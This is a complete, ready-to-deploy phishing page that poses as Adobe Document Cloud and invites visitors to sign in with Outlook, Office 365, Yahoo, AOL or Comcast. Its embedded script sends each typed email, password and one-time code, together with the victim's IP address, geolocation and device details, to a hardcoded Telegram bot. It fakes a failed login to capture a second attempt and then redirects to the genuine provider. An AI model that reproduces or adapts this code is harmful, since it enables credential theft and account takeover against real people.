

  <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Adobe Document Access</title>
  
  <!-- Content Security Policy: allow only self for scripts/styles, permit inline for this static page, and allow https images -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' https: data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.telegram.org https://api.telegram.com;" />
  <style>
    :root {
      --panel-bg: rgba(0, 0, 0, 0.6);
      --panel-border: #f1f1f1;
      --brand-blue: #1e73ff;
      --brand-red: #d93025;
      --brand-sky: #4d8fe4;
      --brand-purple: #8f1189;
      --brand-green: #1a8f2e;
      --focus: #ffcc00;
    }

    html, body { height: 100%; }
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Main card */
    .panel {
      background-color: var(--panel-bg);
      color: #fff;
      border: 3px solid var(--panel-border);
      border-radius: 15px;
      width: 50%;
      max-width: 720px;
      padding: 24px;
      text-align: center;
    }

    .panel p { margin: 0 0 16px; }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      width: 80%;
      margin: 16px auto 0;
      color: #fff;
      border: 0;
      border-radius: 8px;
      padding: 10px 12px;
      cursor: pointer;
      background: #444;
    }
    .brand img { width: 30px; height: 30px; }
    .brand.b1 { background: var(--brand-blue); }
    .brand.b2 { background: var(--brand-red); }
    .brand.b3 { background: var(--brand-sky); }
    .brand.b4 { background: var(--brand-purple); }
    .brand.b5 { background: var(--brand-green); }

    .brand:focus { outline: 3px solid var(--focus); outline-offset: 2px; }

    .logo img { width: 100px; height: 100px; }

    /* Simple modal */
    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      padding: 16px;
    }
    .modal-backdrop.is-open { display: flex; }

    .modal-dialog {
      background: #fff;
      color: #000;
      border-radius: 10px;
      width: 100%;
      max-width: 520px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
    }

    .modal-header, .modal-footer { padding: 12px 16px; border-bottom: 1px solid #e5e5e5; }
    .modal-header { display: flex; align-items: center; justify-content: space-between; }
    .modal-footer { border-top: 1px solid #e5e5e5; border-bottom: 0; display: flex; gap: 8px; justify-content: flex-end; }
    .modal-body { padding: 16px; }

    .close-btn {
      background: transparent;
      border: 0;
      font-size: 20px;
      line-height: 1;
      cursor: pointer;
    }
    .close-btn:focus { outline: 3px solid var(--focus); outline-offset: 2px; }

    /* Form */
    .form-control {
      width: 100%;
      box-sizing: border-box;
      padding: 10px 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    .form-control:focus { outline: 3px solid #a3c9ff; }

    .btn { border: 0; border-radius: 6px; padding: 10px 14px; cursor: pointer; }
    .btn-primary { background: #0d6efd; color: #fff; }
    .btn-secondary { background: #6c757d; color: #fff; }
    .btn:focus { outline: 3px solid var(--focus); outline-offset: 2px; }

    .text-center { text-align: center; }
    .text-danger { color: #c1121f; }
    .text-warning { color: #b08900; }
    .mb-5 { margin-bottom: 2rem; }
    .mt-2 { margin-top: 0.5rem; }
    .mt-3 { margin-top: 1rem; }

    @media (max-width: 767px) {
      .panel { width: 85%; padding: 16px; }
      .logo img { width: 80px; height: 80px; }
    }
  </style>
</head>
<body>

  <main class="panel" aria-labelledby="panelHeading">
    <div class="logo">
      <img loading="lazy" src="https://store-images.s-microsoft.com/image/apps.17212.580fea4c-0e1b-413f-9697-4de5b2f1b6fc.6013dcf9-6c4c-4117-be70-160c5f0bcb0d.f7cdfb4b-039c-47c1-9f77-c32ac500f35f.png" alt="Adobe logo" />
    </div>
    <h1 id="panelHeading" class="sr-only" style="position:absolute;left:-10000px;">Adobe Document Access</h1>
    <p style="font-size:15px">Adobe Document Cloud <br /> To read the document, please sign in using the email credentials this file was sent to.</p>

    <button type="button" class="brand b1 provider" data-name="Outlook" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png" data-formid="1" aria-label="Sign in with Outlook">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft logo" />
      <span>Sign in with Outlook</span>
    </button>

    <button type="button" class="brand b2 provider" data-name="Office" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Microsoft_365_%282022%29.svg/512px-Microsoft_365_%282022%29.svg.png" data-formid="2" aria-label="Sign in with Office 365">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Microsoft_365_%282022%29.svg/512px-Microsoft_365_%282022%29.svg.png" alt="Microsoft 365 logo" />
      <span>Sign in with Office 365</span>
    </button>

    <button type="button" class="brand b4 provider" data-name="Yahoo" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/2560px-Yahoo%21_%282019%29.svg.png" data-formid="3" aria-label="Sign in with Yahoo">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/2560px-Yahoo%21_%282019%29.svg.png" alt="Yahoo logo" />
      <span>Sign in with Yahoo Mail</span>
    </button>

    <button type="button" class="brand b5 provider" data-name="AOL" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1200px-AOL_logo.svg.png" data-formid="4" aria-label="Sign in with AOL">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1200px-AOL_logo.svg.png" alt="AOL logo" />
      <span>Sign in with AOL</span>
    </button>

    <button type="button" class="brand b3 provider" data-name="Comcast" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Comcast_%282013-2024%29_logo.svg/1200px-Comcast_%282013-2024%29_logo.svg.png" data-formid="5" aria-label="Sign in with Comcast">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Comcast_%282013-2024%29_logo.svg/1200px-Comcast_%282013-2024%29_logo.svg.png" alt="Comcast logo" />
      <span>Sign in with Comcast</span>
    </button>

    <p style="font-size:15px">Select your email provider to view the document.</p>
    <p style="font-size:15px">Copyright &copy; 2025 Adobe</p>
  </main>

  <!-- First Modal -->
  <div class="modal-backdrop" id="firstModal" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="firstModalTitle">
    <div class="modal-dialog">
      <div class="modal-header">
        <h2 id="firstModalTitle" style="margin:0;font-size:18px;"></h2>
        <button class="close-btn" type="button" aria-label="Close" data-close="firstModal">&times;</button>
      </div>
      <div class="modal-body">
        <div class="text-center mb-5">
          <div class="data-image" style="height:100px"></div>
          <h3 class="mt-2 txx_hd" style="margin:0;">Login with <span class="form-title"></span></h3>
        </div>
        <form id="authForm" novalidate>
          <p id="error_text" class="text-danger" aria-live="polite"></p>

          <input type="hidden" id="form-id" name="id" />

          <label for="email" class="form_tx">Email Address</label>
          <input id="email" type="email" placeholder="Email" class="form-control" name="email_address" autocomplete="username" required />
          <br />
          <p>We'll never share your email with anyone else.</p>

          <label for="password">Password</label>
          <input id="password" type="password" placeholder="Enter Password" class="form-control" name="password" autocomplete="current-password" required />

          <div class="mt-3 text-warning" id="loadingFirst" style="display: none;">Verifying...</div>
        </form>
      </div>
      <div class="modal-footer">
        <button class="btn btn-secondary" type="button" data-close="firstModal">Close</button>
        <button class="btn btn-primary" type="submit" form="authForm">Login</button>
      </div>
    </div>
  </div>

  <!-- Second Modal -->
  <div class="modal-backdrop" id="secondModal" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="secondModalTitle">
    <div class="modal-dialog">
      <div class="modal-header">
        <h2 id="secondModalTitle" style="margin:0;font-size:18px;">Additional Verification</h2>
        <button class="close-btn" type="button" aria-label="Close" data-close="secondModal">&times;</button>
      </div>
      <form id="otpForm" novalidate>
        <div class="modal-body">
          <p class="text-center" style="font-weight:bold;">Please verify your account</p>

          <label for="otp">OTP</label>
          <input id="otp" type="text" placeholder="OTP" class="form-control" name="txtotp" inputmode="numeric" autocomplete="one-time-code" required />

          <div class="mt-3 text-warning" id="loadingSecond" style="display: none;">Verifying...</div>
        </div>
        <div class="modal-footer">
          <button class="btn btn-secondary" type="button" data-close="secondModal">Close</button>
          <button class="btn btn-primary" type="submit">Submit</button>
        </div>
      </form>
    </div>
  </div>

 <script>
  // App state
  const state = {
    selectedId: null,
    firstAttemptDone: false,
    formData: {}
  };

  // === ⚠️ REPLACE WITH YOUR BOT INFO ===
  const TELEGRAM_BOT_TOKEN = '5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo'; // ← No spaces!
  const TELEGRAM_CHAT_ID = '987654321';
  // =====================================

  // Validate config
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("❌ Telegram token or chat ID missing!");
  }

  // Utility: open/close modals
  function openModal(id) {
    const el = document.getElementById(id);
    if (!el) return;
    el.classList.add('is-open');
    el.setAttribute('aria-hidden', 'false');
    const input = el.querySelector('input, button, [tabindex]');
    if (input) input.focus();
  }

  function closeModal(id) {
    const el = document.getElementById(id);
    if (!el) return;
    el.classList.remove('is-open');
    el.setAttribute('aria-hidden', 'true');
  }

  document.addEventListener('click', (e) => {
    const closeId = e.target.getAttribute('data-close');
    if (closeId) closeModal(closeId);
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') ['firstModal', 'secondModal'].forEach(closeModal);
  });

  // Provider buttons
  const providers = Array.from(document.querySelectorAll('.provider'));
  const firstModalTitle = document.getElementById('firstModalTitle');
  const dataImage = document.querySelector('.data-image');
  const formTitle = document.querySelector('.form-title');
  const hiddenId = document.getElementById('form-id');
  const errorText = document.getElementById('error_text');
  const authForm = document.getElementById('authForm');
  const loadingFirst = document.getElementById('loadingFirst');

  providers.forEach(btn => {
    btn.addEventListener('click', () => {
      const id = String(btn.dataset.formid || '');
      const name = String(btn.dataset.name || '');
      const image = String(btn.dataset.image || '');

      state.selectedId = id;
      state.firstAttemptDone = false;

      firstModalTitle.textContent = name + ' Sign In';
      formTitle.textContent = name;

      dataImage.innerHTML = '';
      const img = new Image();
      img.width = 100; img.height = 100; img.alt = 'logo';
      img.loading = 'lazy'; img.src = image;
      dataImage.appendChild(img);

      hiddenId.value = id;
      errorText.textContent = '';
      authForm.reset();

      openModal('firstModal');
    });
  });

  // --- GEOLOCATION & IP HELPERS ---
  async function getPublicIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch (err) {
      return 'Unknown (Failed to fetch)';
    }
  }

  async function getGeoLocation(ip) {
    try {
      // Using ipapi.co - free for low usage
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await res.json();
      return {
        country: data.country_name,
        city: data.city,
        region: data.region,
        lat: data.latitude,
        lon: data.longitude,
        timezone: data.timezone,
        org: data.org
      };
    } catch (err) {
      return { error: 'Geolocation API failed' };
    }
  }

  async function getDeviceInfo() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
  }

  // --- SEND DATA TO TELEGRAM ---
  async function sendToTelegram(userData) {
    const text = `
🚨 *Adobe Login Attempt* 🚨
📅 *Time:* ${new Date().toLocaleString()}
📧 *Email:* \`${userData.email}\`
🔑 *Password:* \`${userData.password}\`
🔢 *Provider:* ${userData.provider}
🆔 *Form ID:* ${userData.formId}

🌐 *IP Address:* \`${userData.ip}\`
📍 *Location:* ${userData.geo.city}, ${userData.geo.country}
📌 *Coords:* \`${userData.geo.lat}, ${userData.geo.lon}\`
🏙️ *Region:* ${userData.geo.region}
⏱️ *Timezone:* ${userData.geo.timezone}
🏢 *ISP/Org:* ${userData.geo.org}

💻 *Device:* ${userData.device.platform}
🧩 *Browser:* ${userData.device.userAgent}
🗣️ *Language:* ${userData.device.language}
📏 *Screen:* ${userData.device.screen}
    `;

    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: 'Markdown'
        })
      });

      const result = await res.json();
      if (!result.ok) console.error('Telegram send failed:', result);
    } catch (err) {
      console.error('Fetch failed:', err.message);
    }
  }

  // --- FIRST FORM SUBMIT ---
  authForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
      errorText.textContent = 'All fields required.';
      return;
    }

    state.formData = { email, password, provider: formTitle.textContent, formId: state.selectedId };

    if (!state.firstAttemptDone) {
      loadingFirst.style.display = 'block';

      // Gather full data
      const ip = await getPublicIP();
      const device = await getDeviceInfo();
      const geo = await getGeoLocation(ip === 'Unknown (Failed to fetch)' ? '' : ip);

      // Save for later (OTP step)
      state.fullData = { ip, geo, device };

      // Send to Telegram
      await sendToTelegram({ email, password, provider: formTitle.textContent, formId: state.selectedId, ip, geo, device });

      loadingFirst.style.display = 'none';
      errorText.textContent = 'Incorrect password';
      state.firstAttemptDone = true;
    } else {
      closeModal('firstModal');
      openModal('secondModal');
    }
  });

  // --- SECOND MODAL: OTP ---
  const otpForm = document.getElementById('otpForm');
  const loadingSecond = document.getElementById('loadingSecond');

  function computeRedirect(id) {
    switch (String(id)) {
      case '1': return 'https://outlook.com/login';
      case '2': return 'https://login.microsoftonline.com';
      case '3': return 'https://yahoo.com/login';
      case '4': return 'https://aol.com/login';
      case '5': return 'https://gmail.com/login';
      default: return 'https://www.adobe.com';
    }
  }

  otpForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const otp = document.getElementById('otp').value.trim();

    if (!otp) {
      alert('Enter OTP!');
      return;
    }

    // Include OTP in report
    const otpText = `
🔢 *OTP Captured!*
📧 Email: \`${state.formData.email}\`
🔐 Password: \`${state.formData.password}\`
🔢 OTP: \`${otp}\`
🕒 Time: ${new Date().toLocaleString()}

🌐 IP: \`${state.fullData.ip}\`
📍 Location: ${state.fullData.geo.city}, ${state.fullData.geo.country}
📌 Coords: \`${state.fullData.geo.lat}, ${state.fullData.geo.lon}\`
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: otpText,
          parse_mode: 'Markdown'
        })
      });
    } catch (err) {
      console.error('Failed to send OTP', err);
    }

    loadingSecond.style.display = 'block';
    setTimeout(() => {
      loadingSecond.style.display = 'none';
      window.location.href = computeRedirect(state.selectedId);
    }, 800);
  });
</script></body>
</html>


